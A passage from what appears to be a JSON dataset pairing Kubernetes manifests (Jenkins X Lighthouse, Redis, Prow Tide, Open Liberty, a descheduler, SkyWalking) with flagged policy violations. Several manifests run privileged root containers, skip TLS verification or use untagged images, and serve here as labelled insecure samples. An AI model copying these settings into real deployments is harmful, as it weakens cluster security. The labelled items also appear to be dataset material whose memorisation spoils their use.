    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-jx-controller\n  labels:\n    draft: draft-app\n    chart: lighthouse-0.0.683\n    app: lighthouse-jx-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\n    jenkins-x.io/hash: 02b017d8f4c2c6a9dff81ac769baa5da7d60fcc9fee59859671642d393c6f4e2\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      draft: draft-app\n      app: lighthouse-jx-controller\n  template:\n    metadata:\n      labels:\n        draft: draft-app\n        app: lighthouse-jx-controller\n    spec:\n      serviceAccountName: lighthouse-jx-controller\n      containers:\n      - name: lighthouse-jx-controller\n        image: gcr.io/jenkinsxio/lighthouse-jx-controller:0.0.683\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: hnaung\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: JX_DEFAULT_IMAGE\n          value: gcr.io/jenkinsxio/builder-maven:2.1.142-761\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-jx-controller\" does not have a read-only root file system"
  },
  {
    "id": "03779",
    "manifest_path": "data/manifests/the_stack_sample/sample_1681.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-jx-controller\n  labels:\n    draft: draft-app\n    chart: lighthouse-0.0.683\n    app: lighthouse-jx-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\n    jenkins-x.io/hash: 02b017d8f4c2c6a9dff81ac769baa5da7d60fcc9fee59859671642d393c6f4e2\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      draft: draft-app\n      app: lighthouse-jx-controller\n  template:\n    metadata:\n      labels:\n        draft: draft-app\n        app: lighthouse-jx-controller\n    spec:\n      serviceAccountName: lighthouse-jx-controller\n      containers:\n      - name: lighthouse-jx-controller\n        image: gcr.io/jenkinsxio/lighthouse-jx-controller:0.0.683\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: hnaung\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: JX_DEFAULT_IMAGE\n          value: gcr.io/jenkinsxio/builder-maven:2.1.142-761\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-jx-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "03780",
    "manifest_path": "data/manifests/the_stack_sample/sample_1688.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\n    visualize: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n        visualize: 'true'\n    spec:\n      containers:\n      - name: redis\n        image: redis\n        ports:\n        - name: redis-server\n          containerPort: 6379\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"redis\" is using an invalid container image, \"redis\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03781",
    "manifest_path": "data/manifests/the_stack_sample/sample_1688.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\n    visualize: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n        visualize: 'true'\n    spec:\n      containers:\n      - name: redis\n        image: redis\n        ports:\n        - name: redis-server\n          containerPort: 6379\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis\" does not have a read-only root file system"
  },
  {
    "id": "03782",
    "manifest_path": "data/manifests/the_stack_sample/sample_1688.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\n    visualize: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n        visualize: 'true'\n    spec:\n      containers:\n      - name: redis\n        image: redis\n        ports:\n        - name: redis-server\n          containerPort: 6379\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redis\" is not set to runAsNonRoot"
  },
  {
    "id": "03783",
    "manifest_path": "data/manifests/the_stack_sample/sample_1688.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\n    visualize: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n        visualize: 'true'\n    spec:\n      containers:\n      - name: redis\n        image: redis\n        ports:\n        - name: redis-server\n          containerPort: 6379\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"redis\" has cpu request 0"
  },
  {
    "id": "03784",
    "manifest_path": "data/manifests/the_stack_sample/sample_1688.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\n    visualize: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n        visualize: 'true'\n    spec:\n      containers:\n      - name: redis\n        image: redis\n        ports:\n        - name: redis-server\n          containerPort: 6379\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"redis\" has memory limit 0"
  },
  {
    "id": "03785",
    "manifest_path": "data/manifests/the_stack_sample/sample_1689.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: example-noobaa-data\nspec:\n  template:\n    spec:\n      containers:\n      - name: example-noobaa-data\n        image: yiannisgkoufas/awscli-alpine\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        - -c\n        - 'sleep 10 && export AWS_ACCESS_KEY_ID={KEY_ID} && export AWS_SECRET_ACCESS_KEY={ACCESS_KEY}\n          && echo ''hello'' > file1.txt && echo ''world'' > file2.txt && aws --no-verify-ssl\n          --endpoint https://s3.default.svc:443 s3 cp file1.txt s3://{BUCKET} && aws\n          --no-verify-ssl --endpoint https://s3.default.svc:443 s3 cp file2.txt s3://{BUCKET} '\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"example-noobaa-data\" is using an invalid container image, \"yiannisgkoufas/awscli-alpine\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03786",
    "manifest_path": "data/manifests/the_stack_sample/sample_1689.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: example-noobaa-data\nspec:\n  template:\n    spec:\n      containers:\n      - name: example-noobaa-data\n        image: yiannisgkoufas/awscli-alpine\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        - -c\n        - 'sleep 10 && export AWS_ACCESS_KEY_ID={KEY_ID} && export AWS_SECRET_ACCESS_KEY={ACCESS_KEY}\n          && echo ''hello'' > file1.txt && echo ''world'' > file2.txt && aws --no-verify-ssl\n          --endpoint https://s3.default.svc:443 s3 cp file1.txt s3://{BUCKET} && aws\n          --no-verify-ssl --endpoint https://s3.default.svc:443 s3 cp file2.txt s3://{BUCKET} '\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"example-noobaa-data\" does not have a read-only root file system"
  },
  {
    "id": "03787",
    "manifest_path": "data/manifests/the_stack_sample/sample_1689.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: example-noobaa-data\nspec:\n  template:\n    spec:\n      containers:\n      - name: example-noobaa-data\n        image: yiannisgkoufas/awscli-alpine\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        - -c\n        - 'sleep 10 && export AWS_ACCESS_KEY_ID={KEY_ID} && export AWS_SECRET_ACCESS_KEY={ACCESS_KEY}\n          && echo ''hello'' > file1.txt && echo ''world'' > file2.txt && aws --no-verify-ssl\n          --endpoint https://s3.default.svc:443 s3 cp file1.txt s3://{BUCKET} && aws\n          --no-verify-ssl --endpoint https://s3.default.svc:443 s3 cp file2.txt s3://{BUCKET} '\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"example-noobaa-data\" is not set to runAsNonRoot"
  },
  {
    "id": "03788",
    "manifest_path": "data/manifests/the_stack_sample/sample_1689.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: example-noobaa-data\nspec:\n  template:\n    spec:\n      containers:\n      - name: example-noobaa-data\n        image: yiannisgkoufas/awscli-alpine\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        - -c\n        - 'sleep 10 && export AWS_ACCESS_KEY_ID={KEY_ID} && export AWS_SECRET_ACCESS_KEY={ACCESS_KEY}\n          && echo ''hello'' > file1.txt && echo ''world'' > file2.txt && aws --no-verify-ssl\n          --endpoint https://s3.default.svc:443 s3 cp file1.txt s3://{BUCKET} && aws\n          --no-verify-ssl --endpoint https://s3.default.svc:443 s3 cp file2.txt s3://{BUCKET} '\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"example-noobaa-data\" has cpu request 0"
  },
  {
    "id": "03789",
    "manifest_path": "data/manifests/the_stack_sample/sample_1689.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: example-noobaa-data\nspec:\n  template:\n    spec:\n      containers:\n      - name: example-noobaa-data\n        image: yiannisgkoufas/awscli-alpine\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        - -c\n        - 'sleep 10 && export AWS_ACCESS_KEY_ID={KEY_ID} && export AWS_SECRET_ACCESS_KEY={ACCESS_KEY}\n          && echo ''hello'' > file1.txt && echo ''world'' > file2.txt && aws --no-verify-ssl\n          --endpoint https://s3.default.svc:443 s3 cp file1.txt s3://{BUCKET} && aws\n          --no-verify-ssl --endpoint https://s3.default.svc:443 s3 cp file2.txt s3://{BUCKET} '\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"example-noobaa-data\" has memory limit 0"
  },
  {
    "id": "03790",
    "manifest_path": "data/manifests/the_stack_sample/sample_1690.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: ticommunityinfra/tide:v20220130-v1.0.4\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --status-path=gs://prow-tidb-logs/tide-status\n        - --history-uri=gs://prow-tidb-logs/tide-history.json\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tide\" does not have a read-only root file system"
  },
  {
    "id": "03791",
    "manifest_path": "data/manifests/the_stack_sample/sample_1690.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: ticommunityinfra/tide:v20220130-v1.0.4\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --status-path=gs://prow-tidb-logs/tide-status\n        - --history-uri=gs://prow-tidb-logs/tide-history.json\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tide\" is not set to runAsNonRoot"
  },
  {
    "id": "03792",
    "manifest_path": "data/manifests/the_stack_sample/sample_1690.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: ticommunityinfra/tide:v20220130-v1.0.4\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --status-path=gs://prow-tidb-logs/tide-status\n        - --history-uri=gs://prow-tidb-logs/tide-history.json\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tide\" has cpu request 0"
  },
  {
    "id": "03793",
    "manifest_path": "data/manifests/the_stack_sample/sample_1690.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: ticommunityinfra/tide:v20220130-v1.0.4\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --status-path=gs://prow-tidb-logs/tide-status\n        - --history-uri=gs://prow-tidb-logs/tide-history.json\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tide\" has memory limit 0"
  },
  {
    "id": "03794",
    "manifest_path": "data/manifests/the_stack_sample/sample_1691.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: env\nspec:\n  containers:\n  - name: env\n    image: nicholasdille/sleeper\n    env:\n    - name: ENV_SECRET\n      valueFrom:\n        configMapKeyRef:\n          name: config\n          key: foo\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"env\" is using an invalid container image, \"nicholasdille/sleeper\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03795",
    "manifest_path": "data/manifests/the_stack_sample/sample_1691.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: env\nspec:\n  containers:\n  - name: env\n    image: nicholasdille/sleeper\n    env:\n    - name: ENV_SECRET\n      valueFrom:\n        configMapKeyRef:\n          name: config\n          key: foo\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"env\" does not have a read-only root file system"
  },
  {
    "id": "03796",
    "manifest_path": "data/manifests/the_stack_sample/sample_1691.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: env\nspec:\n  containers:\n  - name: env\n    image: nicholasdille/sleeper\n    env:\n    - name: ENV_SECRET\n      valueFrom:\n        configMapKeyRef:\n          name: config\n          key: foo\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"env\" is not set to runAsNonRoot"
  },
  {
    "id": "03797",
    "manifest_path": "data/manifests/the_stack_sample/sample_1691.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: env\nspec:\n  containers:\n  - name: env\n    image: nicholasdille/sleeper\n    env:\n    - name: ENV_SECRET\n      valueFrom:\n        configMapKeyRef:\n          name: config\n          key: foo\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"env\" has cpu request 0"
  },
  {
    "id": "03798",
    "manifest_path": "data/manifests/the_stack_sample/sample_1691.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: env\nspec:\n  containers:\n  - name: env\n    image: nicholasdille/sleeper\n    env:\n    - name: ENV_SECRET\n      valueFrom:\n        configMapKeyRef:\n          name: config\n          key: foo\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"env\" has memory limit 0"
  },
  {
    "id": "03799",
    "manifest_path": "data/manifests/the_stack_sample/sample_1692.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    injection.smarttuning.ibm.com: 'true'\n  labels:\n    app: mock\n  name: mock\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mock\n  template:\n    metadata:\n      labels:\n        app: mock\n    spec:\n      containers:\n      - image: open-liberty:full-java11-openj9\n        imagePullPolicy: IfNotPresent\n        name: openliberty\n        ports:\n        - containerPort: 9080\n        envFrom:\n        - configMapRef:\n            name: mock-envvar\n        volumeMounts:\n        - mountPath: /config/jvm.options\n          subPath: jvm.options\n          name: mock-jvm\n        securityContext:\n          runAsUser: 0\n          privileged: true\n        resources:\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        readinessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            port: 9080\n      volumes:\n      - name: mock-jvm\n        configMap:\n          name: mock-jvm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"openliberty\" does not have a read-only root file system"
  },
  {
    "id": "03800",
    "manifest_path": "data/manifests/the_stack_sample/sample_1692.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    injection.smarttuning.ibm.com: 'true'\n  labels:\n    app: mock\n  name: mock\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mock\n  template:\n    metadata:\n      labels:\n        app: mock\n    spec:\n      containers:\n      - image: open-liberty:full-java11-openj9\n        imagePullPolicy: IfNotPresent\n        name: openliberty\n        ports:\n        - containerPort: 9080\n        envFrom:\n        - configMapRef:\n            name: mock-envvar\n        volumeMounts:\n        - mountPath: /config/jvm.options\n          subPath: jvm.options\n          name: mock-jvm\n        securityContext:\n          runAsUser: 0\n          privileged: true\n        resources:\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        readinessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            port: 9080\n      volumes:\n      - name: mock-jvm\n        configMap:\n          name: mock-jvm\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"openliberty\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "03801",
    "manifest_path": "data/manifests/the_stack_sample/sample_1692.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    injection.smarttuning.ibm.com: 'true'\n  labels:\n    app: mock\n  name: mock\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mock\n  template:\n    metadata:\n      labels:\n        app: mock\n    spec:\n      containers:\n      - image: open-liberty:full-java11-openj9\n        imagePullPolicy: IfNotPresent\n        name: openliberty\n        ports:\n        - containerPort: 9080\n        envFrom:\n        - configMapRef:\n            name: mock-envvar\n        volumeMounts:\n        - mountPath: /config/jvm.options\n          subPath: jvm.options\n          name: mock-jvm\n        securityContext:\n          runAsUser: 0\n          privileged: true\n        resources:\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        readinessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            port: 9080\n      volumes:\n      - name: mock-jvm\n        configMap:\n          name: mock-jvm\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"openliberty\" is privileged"
  },
  {
    "id": "03802",
    "manifest_path": "data/manifests/the_stack_sample/sample_1692.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    injection.smarttuning.ibm.com: 'true'\n  labels:\n    app: mock\n  name: mock\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mock\n  template:\n    metadata:\n      labels:\n        app: mock\n    spec:\n      containers:\n      - image: open-liberty:full-java11-openj9\n        imagePullPolicy: IfNotPresent\n        name: openliberty\n        ports:\n        - containerPort: 9080\n        envFrom:\n        - configMapRef:\n            name: mock-envvar\n        volumeMounts:\n        - mountPath: /config/jvm.options\n          subPath: jvm.options\n          name: mock-jvm\n        securityContext:\n          runAsUser: 0\n          privileged: true\n        resources:\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        readinessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            port: 9080\n      volumes:\n      - name: mock-jvm\n        configMap:\n          name: mock-jvm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"openliberty\" is not set to runAsNonRoot"
  },
  {
    "id": "03803",
    "manifest_path": "data/manifests/the_stack_sample/sample_1692.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    injection.smarttuning.ibm.com: 'true'\n  labels:\n    app: mock\n  name: mock\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mock\n  template:\n    metadata:\n      labels:\n        app: mock\n    spec:\n      containers:\n      - image: open-liberty:full-java11-openj9\n        imagePullPolicy: IfNotPresent\n        name: openliberty\n        ports:\n        - containerPort: 9080\n        envFrom:\n        - configMapRef:\n            name: mock-envvar\n        volumeMounts:\n        - mountPath: /config/jvm.options\n          subPath: jvm.options\n          name: mock-jvm\n        securityContext:\n          runAsUser: 0\n          privileged: true\n        resources:\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        readinessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            port: 9080\n      volumes:\n      - name: mock-jvm\n        configMap:\n          name: mock-jvm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"openliberty\" has cpu request 0"
  },
  {
    "id": "03804",
    "manifest_path": "data/manifests/the_stack_sample/sample_1693.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: descheduler\n  namespace: kube-system\n  labels:\n    app: descheduler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: descheduler\n  template:\n    metadata:\n      labels:\n        app: descheduler\n    spec:\n      serviceAccountName: descheduler-sa\n      containers:\n      - name: descheduler\n        image: cr.d.xiaomi.net/cloud-ml/descheduler:v20211207-v0.22.0-16-g50f9513cb\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/descheduler\n        args:\n        - --policy-config-file\n        - /policy-dir/policy.yaml\n        - --nodeSelector\n        - type=virtual-kubelet\n        - --descheduling-interval\n        - 30m\n        - --v\n        - '3'\n        ports:\n        - containerPort: 10258\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n        volumeMounts:\n        - mountPath: /policy-dir\n          name: policy-volume\n      volumes:\n      - name: policy-volume\n        configMap:\n          name: descheduler-policy-configmap\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"descheduler\" has memory limit 0"
  },
  {
    "id": "03805",
    "manifest_path": "data/manifests/the_stack_sample/sample_1696.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-eureka\n  labels:\n    deploy: apm-eureka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-eureka\n  template:\n    metadata:\n      name: apm-eureka\n      labels:\n        app: apm-eureka\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-eureka\n        image: evanxuhe/apm-eureka:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-eureka\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo\n        ports:\n        - name: http\n          containerPort: 8761\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"apm-eureka\" does not have a read-only root file system"
  },
  {
    "id": "03806",
    "manifest_path": "data/manifests/the_stack_sample/sample_1696.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-eureka\n  labels:\n    deploy: apm-eureka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-eureka\n  template:\n    metadata:\n      name: apm-eureka\n      labels:\n        app: apm-eureka\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-eureka\n        image: evanxuhe/apm-eureka:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-eureka\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo\n        ports:\n        - name: http\n          containerPort: 8761\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sidecar\" does not have a read-only root file system"
  },
  {
    "id": "03807",
    "manifest_path": "data/manifests/the_stack_sample/sample_1696.yaml",
